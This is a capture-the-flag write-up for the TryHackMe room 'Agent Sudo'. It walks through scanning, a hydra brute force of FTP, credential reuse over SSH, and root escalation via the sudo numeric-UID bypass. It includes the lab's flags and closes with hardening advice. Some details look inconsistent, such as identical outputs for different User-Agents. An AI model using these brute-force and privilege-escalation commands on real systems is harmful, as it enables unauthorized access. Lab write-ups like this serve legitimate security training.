---
title: "TryHackMe: Agent Sudo"
author: NeoVirex
categories: [TryHackMe]
tags: [thm, CTF, Penetration Testing, Deep Sea Server, Underwater Infrastructure, Cyber Espionage, Network Exploitation, Secret Server Investigation]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_agent_sudo/
image:
  path: room_img.png
description: "You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. You’ve discovered a clandestine server buried beneath the ocean’s depths. As Agent Sudo, your mission is to infiltrate its defenses, bypass advanced security measures, and expose the hidden truths concealed within."
---
# Agent Sudo

**Created:** June 5, 2025 03:22 AM

---

## Overview

* **Target:** `ctf.thm` (10.10.206.100)
* **Objective:** Gain initial access, escalate privileges, and retrieve both user and root flags.
* **Author:** NeoVirex

---

## 1. Reconnaissance & Service Enumeration

### 1.1 RustScan & Nmap

```bash
rustscan -a ctf.thm -- -A
```

* **Open Ports:** 21 (FTP), 22 (SSH), 80 (HTTP)
* **Services Identified:**

  * `21/tcp` – vsftpd 3.0.3
  * `22/tcp` – OpenSSH 7.6p1 (Ubuntu)
  * `80/tcp` – Apache 2.4.29 (Ubuntu)

Detailed Nmap snippets:

```text
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
22/tcp open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http       Apache httpd 2.4.29 (Ubuntu)
```

---

## 2. Web Application Analysis

The HTTP service hosts a message that reacts to the `User-Agent` header:

```bash
# Using α custom User-Agent “C”
curl -A "C" -L http://ctf.thm
```

```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
```

* When `User-Agent` is “R”, access is denied. Only `C` is allowed because the response addresses “chris”.

```bash
# Using a correct User-Agent “chris” to retrieve the private message
curl -A "chris" -L http://ctf.thm
```

```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
```

* **Note:** This confirms that “chris” is a valid username for FTP.

---

## 3. Brute-Force FTP Credentials

We discovered from the web hint that **“chris”** is likely a valid FTP username and that the password is weak.

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.206.100
```

* **Successful Login:** `chris:crystal`

---

## 4. Exploit & Initial Access (FTP)

### 4.1 Connect to vsftpd as chris

```bash
ftp chris@ctf.thm
# Password: crystal
```

* **Directory Listing:**

  ```text
  To_agentJ.txt   cute-alien.jpg   cutie.png
  ```

* **Download Files:**

  ```bash
  get To_agentJ.txt
  get cute-alien.jpg
  get cutie.png
  ```

* **Inspect To\_agentJ.txt:**

  ```text
  Hi james,

  Glad you find this message. Your login password is hackerrules!

  Don't ask me why the password look cheesy; ask agent R who set this password for you.

  Your buddy,
  chris
  ```

  * We now have credentials for user **james**: password `hackerrules`.

---

## 5. SSH Access as james

### 5.1 SSH into the Machine

```bash
ssh james@ctf.thm
# Password: hackerrules
```

* **Landing in james’s Home Directory:**

  ```text
  $ ls
  Alien_autospy.jpg  user_flag.txt

  $ cat user_flag.txt
  b03d975e8c92a7c04146cfa7a5a313c7
  ```

* **User Flag:** `b03d975e8c92a7c04146cfa7a5a313c7`

---

## 6. Privilege Escalation

### 6.1 Checking sudo Privileges

```bash
sudo -l
# [sudo] password for james: hackerrules
```

```
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User james may run the following command on agent-sudo:
    (ALL, !root) /bin/bash
```

* **Implication:** james can run **`/bin/bash`** as any user except root.

### 6.2 Exploit via Numeric User ID Trick

* Unix numeric user ID `-1` (or `0xffffffff`) is interpreted as **UID 0 (root)**.
* We can trick `sudo` to spawn a root shell:

```bash
sudo -u \#$((0xffffffff)) /bin/bash
```

* **Check Effective User:**

  ```bash
  # whoami
  root
  ```

---

## 7. Lateral Movement & Root Flag

```bash
cd /root
ls
# root.txt

cat root.txt
```

```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

* **Root Flag:** `b53a02f55b57d4439e3341834d70c062`

---

## 8. Cleanup & Recommendations

1. **Remove downloaded key/materials** and **logout**:

   ```bash
   exit             # drop back to james
   rm To_agentJ.txt cute-alien.jpg cutie.png
   ```

2. **Secure Misconfigurations:**

   * Avoid predictable passwords; enforce strong password policies.
   * Do not expose FTP with default configurations—vsftpd should not allow weak authentication.
   * Restrict `sudo` usage; do not grant “run-as-any-user-except-root” privileges.
   * Use absolute paths in `sudo` configurations to prevent numeric UID abuse.

3. **General Advice:**

   * Keep systems patched and services up to date.
   * Monitor for unauthorized login attempts and enforce multi-factor authentication where possible.

---

**End of Writeup**

<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
